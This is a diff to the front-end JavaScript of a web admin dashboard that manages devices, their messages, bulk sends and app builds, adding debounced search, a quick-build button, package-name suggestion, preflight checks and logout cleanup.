+$("#dSearch").addEventListener("input",debounce(renderDetailMsgs,140));
 $("#dDir").addEventListener("change",renderDetailMsgs);
 $("#dUpi").addEventListener("change",renderDetailMsgs);
 $("#dClose").addEventListener("click",closeDetail);
@@ -2788,8 +2726,7 @@ sim_slots:slots.length?slots:null
 })});
 toast("queued to "+r.queued+" device(s), delivered "+r.delivered+(r.note?" — "+r.note:""));
 $("#bulkBody").value="";
-await loadMessages();
-await loadStats();
+await loadMessages(); await loadStats();
 }catch(e){ toast(e.message); } finally{ $("#bulkSend").disabled=false; }
 });
 $("#bulkTarget").addEventListener("change",()=>{
@@ -2849,14 +2786,17 @@ $("#parseOut").textContent=JSON.stringify(r,null,2); }
 catch(e){ $("#parseOut").textContent=e.message; } });
 
 $("#msgFilter").addEventListener("change",renderMessages);
-$("#msgSearch").addEventListener("input",renderMessages);
+$("#msgSearch").addEventListener("input",debounce(renderMessages,160));
 
 $("#appCreate").addEventListener("click",createApp);
-$("#appName").addEventListener("keydown",(e)=>{ if(e.key==="Enter")createApp(); });
+$("#quickBuild").addEventListener("click",quickBuild);
+$("#appName").addEventListener("input",suggestPkg);
+$("#appPkg").addEventListener("input",(e)=>{ e.target.dataset.touched="1"; });
 $("#secretCopy").addEventListener("click",()=>copyText($("#secretValue").textContent.trim()));
 $("#secretHide").addEventListener("click",()=>{ $("#secretOut").hidden=true; });
 $("#logClose").addEventListener("click",()=>{ $("#logPanel").hidden=true; state.logBuild=null; });
 $("#logReload").addEventListener("click",fetchBuildLog);
+$("#pfBtn").addEventListener("click",showPreflight);
 
 $("#kGen").addEventListener("click",async()=>{
 const btn=$("#kGen"); btn.disabled=true;
@@ -2893,7 +2833,7 @@ saveSession(r.username||id,null,keep,r.role);
 }
 if(r&&r.token)setToken(r.token);
 $("#password").value="";
-loginMsg("Signed in", "ok");
+loginMsg("Signed in","ok");
 showApp();
 await afterLogin(r.role);
 toast("welcome, "+(r.role==="admin"?"admin":"user"));
@@ -2903,10 +2843,11 @@ loginMsg(err.message||"Access denied");
 });
 
 $("#logoutBtn").addEventListener("click",async()=>{
+if(state.noAuth){ location.reload(); return; }
 try{ await api("/admin/logout",{method:"POST"},false); }catch(e){}
 try{ if(state.ws)state.ws.close(); }catch(e){}
 try{ if(state.wsUser)state.wsUser.close(); }catch(e){}
-clearTimeout(state.pollTimer); clearTimeout(state.wsTimer);
+clearTimeout(state.pollTimer); clearTimeout(state.buildTimer); clearTimeout(state.wsTimer);
 clearSession();
 state.devices=[]; state.messages=[]; state.devMsgs={}; state.users=[];
 state.growth=null; state.growthEvents=[];
@@ -2926,8 +2867,9 @@ $("#refreshBtn").addEventListener("click",refreshAll);
 
 document.addEventListener("click",(ev)=>{ if(!ev.target.closest(".act-wrap"))$("#actMenu").hidden=true; });
 document.addEventListener("keydown",(ev)=>{ if(ev.key==="Escape"&&!$("#detail").hidden)closeDetail(); });
-document.addEventListener("visibilitychange",()=>{ if(!document.hidden&&state.auth){
-loadDevices().catch(()=>{}); loadMessages().catch(()=>{}); loadStats().catch(()=>{}); } });
+document.addEventListener("visibilitychange",()=>{ if(!document.hidden&&state.auth&&!state.noAdmin){
+loadDevices().catch(()=>{}); loadMessages().catch(()=>{}); loadStats().catch(()=>{}); }
+loadBuilds().catch(()=>{}); });
 
 buildSimChips($("#bulkSims"),"bulk",null);
 checkAuth();
